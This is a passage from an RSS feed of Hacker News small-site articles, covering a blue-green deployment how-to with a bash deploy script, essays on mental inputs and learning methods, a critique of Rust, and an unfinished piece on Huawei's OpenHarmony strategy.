<li>If there was a bug in production this could be fixed by checking out the previous commit. However, this invariably took too long and always involved frenzied googling of the correct git commands.</li>
<li>There was no way of testing the production setup, other than in production.</li>
</ol>

<p><img src="https://keepthescore.co/blog/testing-in-production.jpg"></p>

<p>Switching to blue-green deployments fixed all of these issues.</p>

<h2 id="what-is-blue-green-deployment">What is blue-green deployment?</h2>

<p>Here‚Äôs our definition of a blue-green environment:</p>

<ol>
<li>There are two identical and independent servers hosting the application. One is called green, the other blue.</li>
<li>There is a shared production database that both servers can access.</li>
<li>There is a quick and painless way of routing traffic to the green or the blue server.</li>
</ol>

<p>One of the 2 servers is always serving production traffic, the other is idle. Let‚Äôs say green is serving production traffic, and blue is idle. When a new release is ready, it gets deployed to the idle blue server. Here it can be tested and issues fixed. Remember, the blue server is accessing the production database, so the application can be tested with real data.</p>

<p>Once you‚Äôre satisfied that you‚Äôre ready to go you switch traffic from the green (live) server to the blue server. If any problems occur, you can simply switch back to the green server within seconds, effectively doing a roll-back.</p>

<p>Simple, eh?</p>

<h2 id="basic-components-of-our-setup">Basic components of our setup</h2>

<p>For our blue-green setup we did the following things:</p>

<ol>
<li>We cloned our application server. On DigitalOcean this is super simple: you can create a snapshot (even of a running machine) and create a new machine from that snapshot. An even more elegant way to do this would be to use Docker‚Ä¶ but we haven‚Äôt watched enough YouTube tutorials to do that yet.</li>
<li>Setup a way to switch traffic from one server to the other. We use a <a href="https://www.digitalocean.com/docs/networking/floating-ips/">floating IP from DigitalOcean</a>. Basically they are publicly-accessible static IP addresses that you can assign to servers and instantly remap between other servers in the same datacenter. Our domain (keepthescore.co) resolves to this static IP address.</li>
<li>Setup a way to determine whether the blue or the green server is currently live.</li>
<li>Created a deployment script that always deploys to the idle server.</li>
</ol>

<p>Let‚Äôs dive in a little more:</p>

<h2 id="setting-up-the-servers">Setting up the servers</h2>

<p>Once we‚Äôd cloned the application server, we gave them 2 different hostnames: <code>blue-production</code> and <code>green-production</code>. To do this on Ubuntu you have to do 2 things on the actual servers (in these examples for the green server):</p>

<ol>
<li>Carry out this command: <code>sudo hostnamectl set-hostname green-production</code></li>
<li>Edit the hosts file with <code>sudo vim /etc/hosts</code> and add <code>green-production</code></li>
</ol>

<p>Then we ensured that our app can expose the hostname of the server it‚Äôs currently running on. On Flask you can create a route like this:</p>
<div><pre><code data-lang="python"><span>import</span> socket

<span>@app.route</span>(<span>'/hostname'</span>)
<span>def</span> <span>server_info</span>():
    host_name <span>=</span> socket<span>.</span>gethostname()
    <span>return</span> host_name <span>+</span> <span>'</span><span>\n</span><span>'</span></code></pre></div>
<p>Now it‚Äôs possible for a human or a machine (using <code>curl</code>) to discover which the current production server is. We simply call <a href="https://keepthescore.co/hostname">https://keepthescore.co/hostname</a>. Give it a try by clicking on the link!</p>

<p>One final thing we needed to do is to add the public IP addresses for <code>blue-production</code> and <code>green-production</code> to the local <code>hosts</code> file of our development machine(s).</p>

<h2 id="deployment">Deployment üöÄ</h2>

<p>The deployment script can now use this information to deploy the new version of the software to the <strong>idle</strong> server. Here‚Äôs our deployment script:</p>
<div><pre><code data-lang="bash"><span>#!/usr/bin/env bash
</span><span></span>
<span># Get the current production server and</span> 
<span># set TARGET to the other server</span> 
CURRENT<span>=</span><span>$(</span>curl -s https://keepthescore.co/hostname<span>)</span>
<span>if</span> <span>[</span> <span>"</span>$CURRENT<span>"</span> <span>=</span> <span>"blue-production"</span> <span>]</span>; <span>then</span>
  TARGET<span>=</span><span>"green-production"</span>
<span>elif</span> <span>[</span> <span>"</span>$CURRENT<span>"</span> <span>=</span> <span>"green-production"</span> <span>]</span>; <span>then</span>
  TARGET<span>=</span><span>"blue-production"</span>
<span>else</span>
  echo <span>"Something is not right! üò¨"</span>
  exit -1
<span>fi</span>

echo <span>"Current deployment is "</span> $CURRENT
echo <span>"Deploying to "</span> $TARGET

<span># Do deployment</span>
ssh -q root@$TARGET <span>"cd keepthescore &amp;&amp; git pull"</span>
echo <span>"Deploy to "</span> $TARGET <span>" complete"</span></code></pre></div>
<p>We are now repeating ourselves but the beauty of this script is that it will always deploy to the idle server and not to the live production server. We can  test the deployment on our development machine by simply entering <code>blue-production</code> or <code>green-production</code> into our browser ‚Äì because we‚Äôve added these IP addresses to our local <code>hosts</code> file.</p>

<p>Once we‚Äôre sure that everything‚Äôs working we route traffic to the newly deployed idle server using DigitalOceans‚Äôs web interface for the floating IP addresses.</p>

<p>Our users get routed to the newly deployed software without noticing (hopefully).</p>

<p>Voil√°! ‚ú®</p>

<h2 id="what-about-the-database">What about the database?</h2>

<p>The database is a sore point, because we don‚Äôt have 2 instances of the database. Martin Fowler, who wrote a <a href="https://martinfowler.com/bliki/BlueGreenDeployment.html">great article about blue-green deployments</a> wrote the following:</p>

<p>‚ÄúDatabases can often be a challenge with this technique, particularly when you need to change the schema to support a new version of the software. The trick is to separate the deployment of schema changes from application upgrades. So first apply a database refactoring to change the schema to support both the new and old version of the application, deploy that, check everything is working fine so you have a rollback point, then deploy the new version of the application. (And when the upgrade has bedded down remove the database support for the old version.)‚Äù</p>

<h2 id="that-s-all">That‚Äôs all</h2>

<p>We‚Äôd love to get some feedback on our deployment strategy. Do you have questions? Are we over-engineering? Should we learn Docker? Let us know in the comments below.</p>

<p><span>Photo by <a href="https://unsplash.com/@kugnharski?utm_source=unsplash&amp;utm_medium=referral&amp;utm_content=creditCopyText">Rodrigo Kugnharski</a> on <a href="https://unsplash.com/s/photos/blue-green?utm_source=unsplash&amp;utm_medium=referral&amp;utm_content=creditCopyText">Unsplash</a></span></p>


  

  
  <hr>
  
  

</article> 



        </div> <!-- /.blog-main -->

        


      </div> <!-- /.row -->
    </div></div>]]>
            </description>
            <link>https://keepthescore.co/blog/posts/blue-green-deployment/</link>
            <guid isPermaLink="false">hacker-news-small-sites-24582864</guid>
            <pubDate>Thu, 24 Sep 2020 19:55:50 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Consume less, produce more]]>
            </title>
            <description>
<![CDATA[
Score 39 | Comments 8 (<a href="https://news.ycombinator.com/item?id=24582837">thread link</a>) | @hecticjeff
<br/>
September 24, 2020 | https://www.chrismytton.com/2020/09/24/consume-less-produce-more/ | <a href="https://web.archive.org/web/*/https://www.chrismytton.com/2020/09/24/consume-less-produce-more/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
    
<p>If you have too many inputs then your brain gets overwhelmed. Every piece of information you consume takes up some brain cycles.</p>

<p>If you‚Äôre not producing enough output to match your inputs then it can get clogged up in your brain. You end up with too many strands of thought. Too many lines of enquiry.</p>

<h2 id="excess-consumption-causes-anxiety">Excess consumption causes anxiety</h2>

<p>This can often be a cause of anxiety, stress and depression. Just increasing the amount you produce allows your brain to work through your anxieties.</p>

<p>Perhaps this is why mental health issues are on the rise. There are just so many inputs for our brain in the modern world that we don‚Äôt have time to process them all into coherent outputs, so that we can understand the information we‚Äôre being presented with.</p>

<h2 id="reduce-consumption">Reduce consumption</h2>

<p>Reduce the number of inputs in your daily life.</p>

<ul>
  <li>Stop reading the news</li>
  <li>Spend less time on social media</li>
  <li>Reduce the number of websites you visit daily</li>
  <li>Delete unused apps from your phone</li>
  <li>Eliminate unnecessary calendar appointments</li>
  <li>Spend less time watching TV series</li>
</ul>

<p>Generally stimulate your brain less.</p>

<h2 id="increase-production">Increase production</h2>

<p>Increase the number of productive outputs in your life.</p>

<ul>
  <li>Create something with your hands</li>
  <li>Draw or paint pictures (doesn‚Äôt matter if you‚Äôre good or not)</li>
  <li>Write more, keep a journal or a blog</li>
  <li>Increase your daily step count</li>
  <li>Explore new places</li>
  <li>Exercise regularly</li>
  <li>Cook for yourself, rather than eating out</li>
</ul>

<p>These are things that allow you to express yourself. Express the ideas in your brain. Work through the inputs in your life.</p>

<p>Not everything has to have a point, sometimes you just need to <a href="https://www.chrismytton.com/2019/09/24/do-things-for-fun/">do things for fun</a>.</p>

<p><img src="https://www.chrismytton.com/assets/images/chelt-paint-fest-2020.jpg" alt="Cheltenham Paint Festival 2020 at Cheltenham Spa station"></p>

<h2 id="express-yourself">Express yourself</h2>

<p>It‚Äôs by expressing the ideas in your brain that you can actually think clearly. Because the more you express them the more you can see them. Then you can visualise the ideas. Then you can better structure and organise them and compartmentalize them.</p>

<p>Now stop consuming these words and go and produce something. Express yourself.</p>

  </div></div>]]>
            </description>
            <link>https://www.chrismytton.com/2020/09/24/consume-less-produce-more/</link>
            <guid isPermaLink="false">hacker-news-small-sites-24582837</guid>
            <pubDate>Thu, 24 Sep 2020 19:53:36 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[How to remember what you learn]]>
            </title>
            <description>
<![CDATA[
Score 7 | Comments 3 (<a href="https://news.ycombinator.com/item?id=24582571">thread link</a>) | @flreln
<br/>
September 24, 2020 | https://vasilishynkarenka.com/learning/ | <a href="https://web.archive.org/web/*/https://vasilishynkarenka.com/learning/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div id="site-main">
    <div>

        <article>

            

            <figure>
                <img srcset="https://vasilishynkarenka.com/content/images/size/w300/2020/09/IMG_1517.jpg 300w,
                            https://vasilishynkarenka.com/content/images/size/w600/2020/09/IMG_1517.jpg 600w,
                            https://vasilishynkarenka.com/content/images/size/w1000/2020/09/IMG_1517.jpg 1000w,
                            https://vasilishynkarenka.com/content/images/size/w2000/2020/09/IMG_1517.jpg 2000w" sizes="(max-width: 800px) 400px,
                        (max-width: 1170px) 1170px,
                            2000px" src="https://vasilishynkarenka.com/content/images/size/w2000/2020/09/IMG_1517.jpg" alt="How to remember what you learn">
            </figure>

            <section>
                <div>
                    <p><em>‚ÄúI don‚Äôt remember a damn thing.‚Äù</em></p><p>The book I hold my hands was full of highlights. It seemed like I‚Äôve got all colors of the rainbow on a page. Apparently, this didn‚Äôt help. When I tried recalling ideas from the book, I didn‚Äôt hear a thing. Just. Silence.</p><p>Terrified, I started questioning how much I <em>really</em> know. If I forget everything I read, I can‚Äôt apply my knowledge to the problem at hand. I can‚Äôt transfer it. And without transfer, knowledge is very much like music for deaf ears.</p><p>I quickly did the math. I was planning to invest in learning a few hours a day for the next ~75 years of my life. Staring at the number of potentially wasted hours, I knew exactly what I had to do.</p><hr><p>In the past six months, I‚Äôve devoured dozens of books, research papers, and studies on how people learn. As a result, I‚Äôve designed a learning process that works for me. It‚Äôs not perfect, but an order of magnitude better than what I had before. </p><p>In this work, I outline my workflow so that you can try it out. It applies to any subject or discipline, from programming to economics. If you stumble upon something where it doesn‚Äôt work, let me know.</p><blockquote><em>Make it time-based, take regular breaks, and learn what you‚Äôre curious about.</em></blockquote><p>The most important thing is that my learning is time-based, not goal-based. Setting learning goals such as ‚Äúread X pages today‚Äù is a way to fail because you set up the wrong incentives. When you plan to read X pages by lunch, you can‚Äôt help but begin optimizing for the goal, which leads to focusing on speed instead of understanding. And when you don‚Äôt have those ‚Äúaha‚Äù moments, it is hard to remember what you learn.</p><p>It‚Äôs also important to not overload yourself and take breaks. I do 3h learning sessions every day split into 30 min intervals with 5 min breaks. Breaks help to fall back into the diffuse mode of thinking and get access to a broader set of neural networks in my head. They also warm up my body, and I feel better after moving around for a few minutes.</p><p>As for material, I learn what I‚Äôm interested in. First, because life is <a href="http://www.paulgraham.com/vb.html">too short</a> to do things that you don‚Äôt love. Second, I‚Äôve found that studying stuff I genuinely like awakens my curiosity. And curiosity is essential to develop mastery because mastery is about depth and breadth of knowledge. </p><p>For example, if you‚Äôre learning JavaScript and you‚Äôre curious about it, you‚Äôll go and figure out how JS runtime environment works in Chrome even though the tutorial doesn‚Äôt cover it. Just because you‚Äôre interested. But if you‚Äôre not curious, then you‚Äôll just memorize the tutorial, and your knowledge will be shallow.</p><h2 id="how-my-learning-session-works">How my learning session works</h2><blockquote>Clean up working memory, apply metacognition, and "siege" the thing with questions to improve understanding.</blockquote><p>When I learn, I always have two devices on my desk. I have my laptop with the study material (ie, a book, a video, an article) on the right, and I have my iPad with a text editor open on the left.</p><p>This is how my current setup looks like:</p><figure><img src="https://vasilishynkarenka.com/content/images/2020/09/IMG_2658.jpg" alt="" srcset="https://vasilishynkarenka.com/content/images/size/w600/2020/09/IMG_2658.jpg 600w, https://vasilishynkarenka.com/content/images/size/w1000/2020/09/IMG_2658.jpg 1000w, https://vasilishynkarenka.com/content/images/size/w1600/2020/09/IMG_2658.jpg 1600w, https://vasilishynkarenka.com/content/images/size/w2400/2020/09/IMG_2658.jpg 2400w" sizes="(min-width: 720px) 720px"><figcaption>Morning learning session.</figcaption></figure><p>When I begin learning, I set a timer for 30 minutes and create three files in Drafts:</p><ol><li>A file with a timestamp where my random thoughts go.</li><li>A file with a timestamp where I think about the subject.</li><li>A file with questions.</li></ol><p><strong>The first file is a mind dump.</strong> When I start learning, I immediately begin thinking about things. It‚Äôs almost as if my brain wakes up and starts throwing ideas, tasks, and memories at me. I suspect this comes from the associative memory because I present myself with many triggers when I‚Äôm learning; words and sentences that bear special meaning to me and invoke these ideas.</p><p>But here‚Äôs the problem. If I don‚Äôt write thoughts down, I can‚Äôt focus. My working memory is overloaded with todos, ideas, and emotions. You‚Äôve probably experienced this for yourself ‚Äì your mind is running too fast, and you can‚Äôt really concentrate on what you‚Äôre learning. Having this ‚Äúdump‚Äù file is immensely useful to a) free up my working memory to focus on my learning instead of thinking about these things, and b) store these thoughts somewhere safe to go back to them later and take action.</p><p><strong>The second file is where I write about what I‚Äôm learning.</strong> Folks in the kitchen call it metacognition, which means thinking about thinking. Metacognition is the single best trick I‚Äôve found to improve understanding, and I will write more about it in the future. Whenever I don‚Äôt understand something or see that my understanding is shallow, I begin writing in the first person. It looks like this: ‚ÄúSo Peter explains that there are four characteristics of a monopoly, but I don‚Äôt really understand why branding is one of them; why so?‚Äù</p><p>It‚Äôs also important to note that I don‚Äôt write in a usual sentence-paragraph manner. Instead, I write every thought on a new line. I don‚Äôt even put dots at the end of the sentences. This helps me to focus on understanding instead of nitty-gritty styling and typos. The ‚Äúenter‚Äù key on a keyboard serves as the ‚Äúend of thought‚Äù symbol and helps formulate ideas more clearly.</p><p>Another important idea is that my editor is plain text. I‚Äôve found it incredibly liberating to operate in a plain text environment where you don‚Äôt have incentives to color, underline, bold, italicize, or do some other weird things with the text you‚Äôre writing. Instead of choosing the right font for my heading, I can focus on meaning instead. Also, my plain text app is way faster than all feature-rich text editors, and I‚Äôve found it essential for a thought input environment to be fast. Otherwise, I can't think.</p><p>Here‚Äôs a fragment from my learning of React yesterday:</p><figure><img src="https://vasilishynkarenka.com/content/images/2020/09/IMG_D7F6BD12F133-1.jpeg" alt="" srcset="https://vasilishynkarenka.com/content/images/size/w600/2020/09/IMG_D7F6BD12F133-1.jpeg 600w, https://vasilishynkarenka.com/content/images/size/w1000/2020/09/IMG_D7F6BD12F133-1.jpeg 1000w, https://vasilishynkarenka.com/content/images/size/w1600/2020/09/IMG_D7F6BD12F133-1.jpeg 1600w, https://vasilishynkarenka.com/content/images/size/w2400/2020/09/IMG_D7F6BD12F133-1.jpeg 2400w" sizes="(min-width: 720px) 720px"><figcaption>Metacognition notes from studying React.js.</figcaption></figure><p>You‚Äôre probably thinking that it‚Äôs quite a bit of writing. It is. For an hour-long learning session, I usually do about 500-1000 words in this file. But it‚Äôs worth every character, and here‚Äôs why:</p><ul><li>When I apply metacognition, I understand things <em>way</em> better than when I don‚Äôt. I‚Äôve tested many different learning modes and found metacognition to perform at least 2x better based on my later ability to recall and transfer knowledge. Also, there‚Äôs <a href="https://academicpublishingplatforms.com/downloads/pdfs/ati/volume18/201607070302_09_ATI_Vol11_Issue2_2015_Todorova_and_Karamanska_Study_motivation_satisfaction_students_e-learning_pp.82-89.pdf">some</a> <a href="http://www.csun.edu/science/ref/reasoning/how-students-learn/1.html">research</a> on metacognition as well.</li><li>Having a file with my thinking about the subject keeps my working memory clean. I don‚Äôt feel overloaded as I usually feel after reading many articles at one go. You‚Äôve probably experienced this yourself; your brain is almost melting after an hour of scrolling through the web. That‚Äôs because you present yourself with too much information without really making sense of it. After a few months of applying metacognitive practices, I realized that I can‚Äôt go back. It just feels so strange to experience that cognitive load again.</li><li>Metacognition improves remembering through elaboration and interleaving. When I‚Äôm writing my thoughts in the file, I can‚Äôt help but begin connecting them with other ideas on that topic because of associative memory. And interleaving leads to mastery.</li><li>(Speculation) Training metacognition improves my ability to transform vague notions and thoughts that I have during the day into specific words that I can write down for later analysis. This one is particularly interesting to me, but there‚Äôs no evidence besides my own experiments. And I might be biased because I‚Äôve come up with this method.</li></ul><p>Moreover, I type 2-3x faster than most people because I use <a href="https://barehands.substack.com/p/how-to-type-3x-faster">shortcuts</a>. So it‚Äôs not that bad.</p><p><strong>The third file is questions. </strong>Whenever I stumble upon something that I don‚Äôt understand, I try to break it down into a set of simple questions. Each question in the group takes on a small part of the problem. If the concept is particularly challenging, I try to ‚Äúsiege‚Äù it with questions from many many different angles and break it down even further.</p><p>When I‚Äôm beginning a new session, I always start from the previous one‚Äôs questions file. I only look at questions and answer them before I‚Äôm beginning new learning. This doesn‚Äôt sound like very much fun, but it‚Äôs actually pretty interesting to explain stuff to yourself if you do it out loud. Answering questions improves my understanding and helps to connect ideas together. And yes, answering questions counts as learning ‚Äì probably the most efficient learning you could be doing.</p><p><em>I'm not going into much detail on questions because Michael Nielsen has done a phenomenal job describing it <a href="http://augmentingcognition.com/ltm.html">here</a>.</em></p><h2 id="what-happens-after-the-session">What happens after the session</h2><blockquote>Write a dense summary, provoke elaboration, interleaving, and transfer, and choose what to never forget.</blockquote><p>After the session is done, and my three files are full of information, I begin the recap process.</p><p><strong>First, I write a three to five sentence-long summary of what I‚Äôve just studied.</strong> Here I try to distill the material‚Äôs core idea and compress the whole thing into a maximally dense chunk. When I‚Äôm summarizing, my laptop is closed. Not looking at the text helps to ‚Äúcompress‚Äù the idea to its core and make a small ‚Äúhook‚Äù to my memory to later see what the whole book was about.</p><p>Here‚Äôs how my summary note looks like: </p><figure><img src="https://vasilishynkarenka.com/content/images/2020/09/IMG_9771D059CFD1-1.jpeg" alt="Recap of studying React.js." srcset="https://vasilishynkarenka.com/content/images/size/w600/2020/09/IMG_9771D059CFD1-1.jpeg 600w, https://vasilishynkarenka.com/content/images/size/w1000/2020/09/IMG_9771D059CFD1-1.jpeg 1000w, https://vasilishynkarenka.com/content/images/size/w1600/2020/09/IMG_9771D059CFD1-1.jpeg 1600w, https://vasilishynkarenka.com/content/images/size/w2400/2020/09/IMG_9771D059CFD1-1.jpeg 2400w" sizes="(min-width: 720px) 720px"><figcaption>Recap of studying React.js.</figcaption></figure><p>Very often, what I‚Äôm writing in the summary section is not what the text was about, but what it means to me. In other words, if both of us read this text and wrote a summary of it, mine would be very different than yours.</p><p>After I‚Äôm done with the summary, I write down the answers to three questions:</p><ol><li>What are the key ideas? </li><li>How can I apply this knowledge that I learned? </li><li>How do these ideas relate to what I already know?</li></ol><p><strong>The first question speaks for itself.</strong> I try to remember what I just read and write down as many ideas as I can bring back. When I began applying the metacognition trick that I mentioned earlier, I noticed a 3x increase in the number of concepts I could recall. And as I speculate that long-term memory recall is influenced by initial interleaving and recall, this might actually help to improve your long-term memory.</p><p><strong>The second question is about transfer.</strong> The sole purpose of learning is to apply the knowledge that we learn. Without application, ‚Ä¶</p></div></section></article></div></div></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://vasilishynkarenka.com/learning/">https://vasilishynkarenka.com/learning/</a></em></p>]]>
            </description>
            <link>https://vasilishynkarenka.com/learning/</link>
            <guid isPermaLink="false">hacker-news-small-sites-24582571</guid>
            <pubDate>Thu, 24 Sep 2020 19:31:33 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[What‚Äôs Stopping Me from Using Rust?]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 0 (<a href="https://news.ycombinator.com/item?id=24582337">thread link</a>) | @lukastyrychtr
<br/>
September 24, 2020 | https://mgrech.dev/whats-stopping-me-from-using-rust/ | <a href="https://web.archive.org/web/*/https://mgrech.dev/whats-stopping-me-from-using-rust/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
    <p>Let me start out by saying that I‚Äôve been using C++ for over a decade and I consider myself an advanced C++ user‚Äîthat clearly biases my perspective. If there is something stupid that C++ lets me do, I‚Äôve probably tried it at some point (and yes, that includes building a compile-time brainfuck interpreter before <code>constexpr</code> was the new shiny thing and using template template template parameters). Rust is a great language and has without a doubt a bright future ahead of it. The memory safety it provides is a killer feature that I‚Äôve only realized I‚Äôve been missing in C++ after trying Rust. There are a lot of things I like about the language like nice stack traces by default, the borrow checker, a proper build process, the package manager, ‚Ä¶ and the list goes on.</p>

<p>That said, there are a few reasons why I still cannot or prefer not to use Rust. Some of them are just minor inconveniences, some are major annoyances and some are complete dealbreakers. With this post I‚Äôm going to try to list things that stop me from using the language as I remember it. Please note that this is not meant to be a complete list. In particular, it‚Äôs been a few months since I‚Äôve last tried Rust and I might be forgetting about some things or not remembering them 100% accurately. I‚Äôm also sure the language has made progress in the meantime. Nonetheless, here goes ‚Ä¶</p>

<h4 id="ugly-generic-syntax">Ugly Generic Syntax</h4>
<p>Let‚Äôs start out with the easy one, the so-called <a href="https://matematikaadit.github.io/posts/rust-turbofish.html">turbofish</a>. I find the examples that create container objects especially bad, like <code>Vec::&lt;u8&gt;::new()</code>. I‚Äôm not quite sure why this specific syntax was chosen‚ÄîI assume it has something to do with parsing ambiguities that would arise without the <code>::</code> regarding angle brackets being confused for comparison operators. I get not wanting to deal with this context-sensitivity, but are there really no better alternatives? <a href="https://dlang.org/spec/template.html">D uses the syntax</a> <code>X!(T)</code>, which has the nice property that parentheses can be omitted if only a single type is passed.</p>

<h4 id="naming">Naming</h4>
<p>This one I find really weird. Mostly because it seems so unnecessary for a relatively new language like Rust that is able to learn from many older languages. I‚Äôm talking about how things in the Rust standard library tend to be named. There are the names that are way too short like <code>Vec</code>, <code>Eq</code>, <code>Ord</code>, <code>Arc</code> and so on. This feels like <a href="https://en.cppreference.com/w/c/string/byte/strstr">strstr</a> all over again. And then there are the names that are actual words, but way too generic to infer the actual meaning without looking at the source or documentation. An example of this is the <code>Debug</code> trait. Couldn‚Äôt this be named <code>DebugFormattable</code>, <code>DebugStringifyable</code> or something like that? Another one of these is <code>Into</code>. Take a look at <a href="https://doc.rust-lang.org/std/convert/trait.Into.html#examples">this example from the docs</a>, in particular this line:</p>
<div><div><pre><code><span>assert_eq!</span><span>(</span><span>bytes</span><span>,</span> <span>s</span><span>.into</span><span>());</span>
</code></pre></div></div>

<p>What? I can‚Äôt be the only one who finds the use of a preposition as a function name very confusing.</p>

<h4 id="no-variadic-templates">No Variadic Templates</h4>
<p>This is a major dealbreaker for me. I see the same problems in every programming language I‚Äôve used that supports some form of generics but no variadics: Java, Kotlin and now Rust. They end up duplicating code for functions taking <code>0</code>, <code>1</code>, ‚Ä¶ , <code>k-1</code>, <code>k</code> arguments for some hardcoded <code>k</code>. It means you cannot write a generic <code>printf</code> without wrapping the arguments in an untyped array like Java‚Äôs <code>Object[]</code> or using macros to emulate them like Rust does. And these are just the most basic use cases, you can do much more interesting things with variadic generic types.
Having variadic templates means that you don‚Äôt need duplication, you can support any number of parameters and there is no overhead. They are an essential building block for truly generic abstractions.</p>

<h4 id="no-value-template-parameters">No Value Template Parameters</h4>
<p>While we‚Äôre on the topic of generics, Rust does not let me pass compile-time constants as generic parameters. This means I cannot have a statically-sized vector or matrix class that is generic over the number of elements. You might be able to do it by requiring the user to pass an array type, but that is not pretty and means they could pass an invalid type. It is my understanding though that this issue is being worked on, so I have hope that this will be supported in the not too distant future.</p>

<h4 id="no-template-specializations-and-partial-template-specializations">No Template Specializations and Partial Template Specializations</h4>
<p>To be honest, I feel like this is not as much of an immediate blocker as something that I know I‚Äôm going to need for some very specific thing at some point in the future. I know because I use it in C++ too, although very infrequently.
Partial specializations open the door to type functions, like <code>std::remove_pointer</code> in C++. That template is simply specialized on <code>T*</code> and returns <code>T</code> in that case.</p>

<h4 id="error-handling-is-a-mess">Error Handling is a Mess</h4>
<p>I‚Äôve saved this one for last and it‚Äôs going to be controversial so buckle up. If I could choose just one thing to be changed about Rust then forget about everything else because it would be this one.
The way ‚Äúidiomatic‚Äù error handling is currently done in Rust is just untenable to me, it infects everything. Every return is wrapped in an <code>Ok()</code> or <code>Err()</code> which just adds unnecessary noise, every return type must be wrapped in <code>Result&lt;&gt;</code>. It‚Äôs awful.
When I‚Äôm coding I usually start out by writing functions that cannot fail and then add error conditions in as I discover them. But what this means is that every single function in the entire call chain needs to have its return type updated and all return statements wrapped in <code>Ok()</code>. This is so tedious, I genuinely cannot comprehend how it does not come up more often. Am I doing something wrong here or has simply nobody dared to question the design?
Regardless, let me make a suggestion to improve the situation: Introduce syntax that separates the error from the return value, for example:</p>
<div><div><pre><code><span>fn</span> <span>can_fail</span><span>()</span> <span>-&gt;</span> <span>f32</span> <span>|</span> <span>MyError</span>
</code></pre></div></div>
<p>This would be equivalent to <code>Result&lt;f32, MyError&gt;</code>. The compiler can then translate every <code>return val;</code> to <code>return Ok(val);</code> if the function declares an error. For the failure return case we‚Äôre also going to need new syntax that desugars to <code>return Err(val);</code>, I suggest <code>fail val;</code>.
The result is that the code is semantically equivalent to the manual version, but returns are now always the same, regardless of whether the function can fail or not. All the noise is gone. You would still need to manually propagate errors, but I consider this a good thing‚Äîit is a hidden code path after all.</p>

<h2 id="conclusion">Conclusion</h2>
<p>I wrote this post because I‚Äôve been noticing an uptick in the amount of positive coverage Rust has been getting lately and I felt that my view was underrepresented. By no means am I saying that Rust is a bad language, just that it leaves a lot to be desired. In the end, it is all about trade-offs: Is the gain in memory safety worth the loss of flexibility? Presently I can answer this question for myself and my hobbyist projects with no. But Rust is clearly the future and I will hopefully be able to switch one day.</p>

  </div></div>]]>
            </description>
            <link>https://mgrech.dev/whats-stopping-me-from-using-rust/</link>
            <guid isPermaLink="false">hacker-news-small-sites-24582337</guid>
            <pubDate>Thu, 24 Sep 2020 19:08:34 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[300 Years: Huawei's Open Source Strategy]]>
            </title>
            <description>
<![CDATA[
Score 3 | Comments 1 (<a href="https://news.ycombinator.com/item?id=24582314">thread link</a>) | @ceohockey60
<br/>
September 24, 2020 | https://interconnected.blog/300-years-huawei-open-source-strategy/ | <a href="https://web.archive.org/web/*/https://interconnected.blog/300-years-huawei-open-source-strategy/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div id="english-version">
                        <p>Lost in the fog of TikTok was an important announcement: Huawei open sourced its homemade mobile operating system, HarmonyOS, now dubbed OpenHarmony. This announcement flew under the radar, but has far-reaching implications to not just the future of mobile technology, but also how that landscape will influence the geopolitical chess match between the U.S. and China.</p><p>But like many things that come out of China, it‚Äôs less a game of chess, but more a game of <a href="https://en.wikipedia.org/wiki/Go_(game)">Go</a>. </p><figure><img src="https://interconnected.blog/content/images/2020/09/huawei-oss-strategy_small-2.jpg" alt="" srcset="https://interconnected.blog/content/images/size/w600/2020/09/huawei-oss-strategy_small-2.jpg 600w, https://interconnected.blog/content/images/size/w1000/2020/09/huawei-oss-strategy_small-2.jpg 1000w, https://interconnected.blog/content/images/2020/09/huawei-oss-strategy_small-2.jpg 1568w" sizes="(min-width: 720px) 720px"></figure><h2 id="openharmony-the-technology">OpenHarmony: the Technology</h2><p>Let‚Äôs first get a handle on the technology that underpins OpenHarmony. Because the project started, first in 2012 and intensified in 2019, as a strategic initiative to reduce Huawei‚Äôs reliance on the Android operating system due to U.S. sanctions, many <a href="https://www.forbes.com/sites/davidphelan/2020/08/28/what-is-huaweis-smartphone-operating-system--should-i-buy-into-it/#4ca0a8311fd7">mistakenly believe</a> it is based on either Android or Linux (of which Android is based). <strong>That‚Äôs not true.</strong></p><p>OpenHarmony is based on another open source operating system called <a href="https://en.wikipedia.org/wiki/FreeBSD">FreeBSD</a>. Interestingly, Apple‚Äôs macOS and iOS also leveraged FreeBSD indirectly from another operating system project called Darwin. So, on a bits and bytes level, Huawei‚Äôs OpenHarmony is more similar to iOS than Android.</p><p>This is a smart decision because if the whole point is to reduce reliance on Android, the most important thing to avoid is co-mingling code with either Android or Linux in case it triggers obscure licensing restrictions. And the last thing a development team wants is to have technology licensing lawyers checking every line of code the engineers write, especially when they need to develop quickly to avoid an existential crisis, which is what Huawei has right now.</p><p>Because the project is open sourced, there‚Äôs a lot one can do now to evaluate and verify OpenHarmony. In fact, I verified the <a href="https://openharmony.gitee.com/openharmony/kernel_liteos_a/blob/master/bsd/arm/autoconf.c">FreeBSD lineage by rummaging through</a> its codebase, which is all hosted on Gitee. For readers who had a chance to read my previous post ‚Äú<a href="https://interconnected.blog/can-you-nationalize-open-source/"><strong>Can You ‚ÄòNationalize‚Äô Open Source?</strong></a>‚Äù, Gitee should sound familiar. It is a Git-based developer collaboration application that was recently anointed by the Ministry of Industry and Information Technology (MIIT) as the domestic ‚Äúnational champion‚Äù to drive open source growth in China. <strong>What I didn‚Äôt know when I wrote the previous post was that Huawei also became a strategic investor in Gitee in early September via </strong><a href="https://media.qimingpian.cn/qmp/b131b66d760b6b900485a1e30c2762f5.html"><strong>its corporate venture arm, Habo</strong></a><strong>.</strong></p><p>But as every open source technologist can attest, no project ever gets traction without a long period of steadfast community-building and credibility-building. That‚Äôs where the OpenAtom Foundation comes in.</p><h2 id="openatom-the-foundation">OpenAtom: the Foundation</h2><p>The OpenAtom Foundation is China‚Äôs first non-profit organization of its kind geared towards fostering open source technologies, much in the same way as the Linux Foundation or the Apache Software Foundation. <strong>Huawei drove the founding of this foundation, and OpenHarmony is its anchor project.</strong></p><p>But what is the point of a foundation anyway? As 